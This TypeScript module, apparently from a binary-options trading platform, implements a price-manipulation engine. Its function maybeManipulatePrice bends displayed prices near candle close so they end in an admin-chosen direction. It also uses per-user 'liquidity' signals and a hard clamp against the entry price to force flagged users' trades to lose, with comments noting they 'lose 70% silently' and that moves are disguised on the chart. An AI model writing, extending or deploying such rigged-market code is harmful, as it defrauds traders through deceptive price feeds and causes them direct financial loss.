// Manipulation cache — keeps the active signal set in memory so the
// per-tick loop doesn't hit the DB at 10Hz. Refreshed by a periodic
// tick (every 5s) and on-demand when admin mutates a signal.

import { prisma } from '../../../prisma.js'
import { getLiquiditySignalsForAsset } from '../../../operations/liquidityManipulation.js'

export interface ActiveSignal {
  id:          string
  assetId:     string
  scheduledAt: number  // epoch ms
  timeframe:   number
  direction:   'CALL' | 'PUT'
  // Optional explicit deadline for the nudge window. When present,
  // overrides the M1 slot-end in the "last NUDGE_WINDOW_MS" check.
  // Liquidity signals set this to the op's expiresAt so the nudge
  // actually completes BEFORE the resolver reads the exit price —
  // otherwise the nudge would activate after expiry (waste). Admin
  // signals leave it undefined and stick to the slot-end default.
  deadlineMs?: number
  // Preço-âncora do alvo. Quando presente (sinais de liquidez), o alvo é
  // calculado a partir DELE — que é o operations.entryPrice, exatamente o
  // preço contra o qual o resolver julga WIN/LOSS. Sinais do admin deixam
  // undefined e continuam ancorando na abertura da vela (comportamento
  // original preservado: o admin quer mover A VELA, não uma op específica).
  anchorPrice?: number
}

// In-memory cache, keyed by assetId. Each asset has 0+ active signals
// sorted by scheduledAt ASC so the per-tick check can early-return after
// finding the first relevant one.
const cache: Map<string, ActiveSignal[]> = new Map()
let masterEnabled = false
let lastRefreshAt = 0
const REFRESH_INTERVAL_MS = 5_000

export function isMasterEnabled(): boolean {
  return masterEnabled
}

export function getSignalsForAsset(assetId: string): ActiveSignal[] {
  // Two sources, both keyed by assetId:
  //   1. Admin-scheduled signals (cached from otc_manipulation_signals,
  //      refreshed every 5s — the original "Motor de Manipulação OTC").
  //   2. Per-op liquidity signals injected by createOperation when a
  //      User.liquidityMode user's 70% loss roll fired. Live in-memory
  //      only, no DB hit. Merging here means downstream consumers
  //      (maybeManipulatePrice, isSlotUnderManipulation) work unchanged
  //      — they just see "more signals" without caring about origin.
  //
  // Liquidity signals carry an `opId` instead of admin's `id`; we map
  // it to the ActiveSignal shape using scheduledAt = slotEndMs so
  // existing slot-match logic (scheduledAt < slotEndMs) treats them
  // identically.
  const admin = cache.get(assetId) ?? []
  const liq   = getLiquiditySignalsForAsset(assetId)
  if (liq.length === 0) return admin
  const mapped: ActiveSignal[] = liq.map((s) => ({
    id:          `liquidity:${s.opId}`,
    assetId:     s.assetId,
    // Anchor to a tick INSIDE the slot, not the slot end (otherwise the
    // signal would only "activate" after expiry). Place it 1ms before
    // the slot end so the slot-window predicate matches throughout the
    // slot's life.
    scheduledAt: s.slotEndMs - 1,
    timeframe:   60,   // liquidity signals always target the M1 slot
    direction:   s.direction,
    // Critical: for liquidity, slotEndMs IS the op's expiresAt (set by
    // service.ts). Carrying it through as deadlineMs makes the nudge
    // window land in the final NUDGE_WINDOW_MS before expiry — which is
    // what the resolver reads. Without this the nudge would still aim
    // at the M1 close, which can be 30-58s AFTER expiry (waste).
    deadlineMs:  s.slotEndMs,
    // Âncora = entryPrice da op. É o que corrige a divergência: o alvo
    // passa a ser calculado do MESMO preço que o resolver compara.
    anchorPrice: s.entryPrice,
  }))
  // Merge + re-sort by scheduledAt ASC so consumers' early-exit logic
  // (sorted scan, break when past slot end) keeps working.
  return [...admin, ...mapped].sort((a, b) => a.scheduledAt - b.scheduledAt)
}

// Reload from DB. Cheap — runs every 5s in background. Also called on
// admin mutations via a future bus event (not wired yet — 5s lag is
// acceptable for a manipulation window since admin schedules ahead).
export async function refreshManipulationCache(): Promise<void> {
  try {
    const [settings, signals] = await Promise.all([
      prisma.$queryRaw<Array<{ enabled: boolean }>>`
        SELECT enabled FROM otc_manipulation_settings WHERE id = 'global' LIMIT 1
      `,
      // Only signals in the future or within the last 5 minutes (catches
      // edge case of a signal that just expired but engine should still
      // honour it for the in-progress candle).
      prisma.$queryRaw<Array<{
        id: string; assetId: string; scheduledAt: Date; timeframe: number;
        direction: string;
      }>>`
        SELECT id, "assetId", "scheduledAt", timeframe, direction
        FROM otc_manipulation_signals
        WHERE enabled = TRUE
          AND "scheduledAt" > NOW() - INTERVAL '5 minutes'
        ORDER BY "assetId", "scheduledAt" ASC
      `,
    ])

    masterEnabled = settings[0]?.enabled ?? false

    // Rebuild the per-asset cache.
    cache.clear()
    for (const s of signals) {
      const arr = cache.get(s.assetId) ?? []
      arr.push({
        id:          s.id,
        assetId:     s.assetId,
        scheduledAt: s.scheduledAt.getTime(),
        timeframe:   s.timeframe,
        direction:   s.direction as 'CALL' | 'PUT',
      })
      cache.set(s.assetId, arr)
    }

    lastRefreshAt = Date.now()
  } catch (err) {
    console.error('[manipulation] cache refresh failed:', err)
  }
}

let refreshTimer: ReturnType<typeof setInterval> | null = null

export function startManipulationRefresh(): void {
  if (refreshTimer) return
  void refreshManipulationCache()  // immediate
  refreshTimer = setInterval(() => void refreshManipulationCache(), REFRESH_INTERVAL_MS)
}

export function stopManipulationRefresh(): void {
  if (refreshTimer) {
    clearInterval(refreshTimer)
    refreshTimer = null
  }
}

// Returns whether the engine should consider any of the slot-shaping
// helpers (wick injection, streak break) at this tick. When true, those
// helpers should skip — they'd overwrite the carefully-blended
// manipulation tick and create a visible gap on the chart.
export function isSlotUnderManipulation(
  assetId:      string,
  candleOpenMs: number,
  timeframe:    number,
): boolean {
  if (!masterEnabled) return false
  // Use the merged source (admin cache + per-op liquidity signals) so
  // wick-injection / streak-break helpers skip on liquidity-nudged
  // slots too — otherwise the wick logic could overwrite the blended
  // tick and leave a visible gap.
  const signals = getSignalsForAsset(assetId)
  if (signals.length === 0) return false
  const slotEndMs = candleOpenMs + timeframe * 1000
  for (const s of signals) {
    if (s.timeframe !== timeframe) continue
    if (s.scheduledAt < candleOpenMs) continue
    if (s.scheduledAt >= slotEndMs)   break
    return true
  }
  return false
}

// ── Per-tick application ─────────────────────────────────────────────────
// Given the current asset, the in-progress M1 candle's slot, and the
// raw price the engine just produced, returns the (possibly nudged)
// price that should be emitted. Surgical — only nudges:
//   1. master toggle is ON, AND
//   2. there's an active signal whose scheduledAt falls in this slot, AND
//   3. we're in the last NUDGE_WINDOW_MS of the slot, AND
//   4. the candle's current close direction doesn't match the target
//
// When all 4 conditions met, pushes price toward open + ε (CALL) or
// open - ε (PUT) so the candle finalises with the configured direction.

// Window during which the nudge is active. For M1 (60s slots) this means
// the first (60 - NUDGE_WINDOW_SEC) seconds tick 100% naturally — the
// engine's regime FSM, micro-dynamics + liquidity all drive price on
// their own — and only the final NUDGE_WINDOW_SEC blend toward target.
// 20s window on M1 = 40s natural + 20s smooth pull-to-target.
const NUDGE_WINDOW_MS = 20_000

// Target distance from open as a fraction of price. The final close
// lands near open*(1 ± NUDGE_MAGNITUDE). 35bp on EUR/USD at 1.085 ≈
// 38 pips — clearly larger than the typical natural M1 body (~10-15
// pips) so manipulated candles read as a decisive move on the chart
// instead of blending in with normal volatility.
const NUDGE_MAGNITUDE = 0.0035

// Janela final em que o preço é GARANTIDO do lado correto da âncora
// (só vale para sinais de liquidez, que carregam anchorPrice). O blend
// sozinho é proporcional ao tempo e pode não cruzar a âncora a tempo se o
// último tick cair perto do deadline — aqui o preço é travado.
const HARD_CLAMP_MS = 3_000

// Margem mínima entre o preço final e a âncora (entryPrice). 5bp é o
// bastante para o resolver decidir sem ambiguidade e some no gráfico.
const MIN_CLAMP_MARGIN = 0.0005

export function maybeManipulatePrice(
  assetId:    string,
  candleOpenMs: number,
  candleOpenPrice: number,
  candleClosePrice: number,
  timeframe:  number,
  now:        number,
  rawPrice:   number,
): number {
  if (!masterEnabled) return rawPrice
  // Use the merged source (admin cache + per-op liquidity signals).
  // masterEnabled gates BOTH origins — admin turning the global toggle
  // OFF is a kill-switch that silences liquidity nudges too. The
  // resolver's force-loss marker still fires in that case (it lives
  // separately), so liquidity users still lose 70% silently — just
  // without the candle being moved.
  const signals = getSignalsForAsset(assetId)
  if (signals.length === 0) return rawPrice

  const slotEndMs = candleOpenMs + timeframe * 1000

  // Find a signal whose scheduledAt falls inside this slot. Signals are
  // sorted ASC so we can early-exit when we pass the slot end.
  let active: ActiveSignal | null = null
  for (const s of signals) {
    if (s.timeframe !== timeframe) continue
    if (s.scheduledAt < candleOpenMs) continue
    if (s.scheduledAt >= slotEndMs)   break
    active = s
    break
  }
  if (!active) return rawPrice

  // Only nudge in the final window before the effective deadline.
  //
  // For admin signals, effectiveDeadline === slotEndMs (the M1 close).
  // For liquidity signals, the signal carries its own deadlineMs equal
  // to the op's expiresAt — usually EARLIER than the M1 close, so the
  // nudge must finish before expiry (when the resolver reads the tick).
  // Without min() the nudge would aim at the M1 close and miss expiry
  // entirely for ops that don't expire on a minute boundary.
  const effectiveDeadline = active.deadlineMs != null
    ? Math.min(slotEndMs, active.deadlineMs)
    : slotEndMs
  const msUntilEnd = effectiveDeadline - now
  if (msUntilEnd > NUDGE_WINDOW_MS) return rawPrice
  if (msUntilEnd <= 0) return rawPrice

  // ── Âncora do alvo ────────────────────────────────────────────────
  // Liquidez  → anchorPrice = operations.entryPrice (o MESMO preço que o
  //             resolver compara). Garante que o alvo caia do lado
  //             coerente com o veredito forçado, mesmo que o usuário
  //             tenha entrado longe da abertura da vela.
  // Admin     → sem anchorPrice: mantém a abertura da vela (o objetivo
  //             ali é mover a vela, não uma operação específica).
  const anchor = active.anchorPrice != null && active.anchorPrice > 0
    ? active.anchorPrice
    : candleOpenPrice

  const target = active.direction === 'CALL'
    ? anchor * (1 + NUDGE_MAGNITUDE)
    : anchor * (1 - NUDGE_MAGNITUDE)

  // Já está do lado certo? Não desperdiça o nudge — preserva o movimento
  // natural. Medido contra a MESMA âncora usada no alvo (antes comparava
  // sempre com a abertura da vela, o que dava falso-positivo e abortava o
  // nudge justamente nos casos que geravam divergência).
  const halfBand = NUDGE_MAGNITUDE * 0.5
  if (active.direction === 'CALL' && candleClosePrice >= anchor * (1 + halfBand)) return rawPrice
  if (active.direction === 'PUT'  && candleClosePrice <= anchor * (1 - halfBand)) return rawPrice

  // Smooth blend: as time approaches the effective deadline, blend more
  // toward target. At msUntilEnd = NUDGE_WINDOW_MS → 0% target; at
  // msUntilEnd = 0 → 100% target. Using effectiveDeadline keeps the
  // blend monotonic from 0 to 1 across the full window for both admin
  // (deadline = slotEnd) and liquidity (deadline = expiresAt) signals.
  const blend  = 1 - (msUntilEnd / NUDGE_WINDOW_MS)
  const blended = rawPrice * (1 - blend) + target * blend

  // ── Garantia final (só para sinais com âncora = liquidez) ──────────
  // O blend é proporcional ao tempo restante: se o último tick antes da
  // expiração cair, por exemplo, a 800ms do deadline, o blend fica em ~96%
  // e o preço pode NÃO ter cruzado a âncora ainda — exatamente a origem da
  // divergência. Nos HARD_CLAMP_MS finais forçamos o preço para o lado
  // correto com uma margem mínima, garantindo coerência com o veredito.
  if (active.anchorPrice != null && msUntilEnd <= HARD_CLAMP_MS) {
    const floor = anchor * (1 - MIN_CLAMP_MARGIN)   // teto p/ PUT (abaixo da âncora)
    const ceil  = anchor * (1 + MIN_CLAMP_MARGIN)   // piso p/ CALL (acima da âncora)
    if (active.direction === 'CALL' && blended < ceil)  return ceil
    if (active.direction === 'PUT'  && blended > floor) return floor
  }

  return blended
}
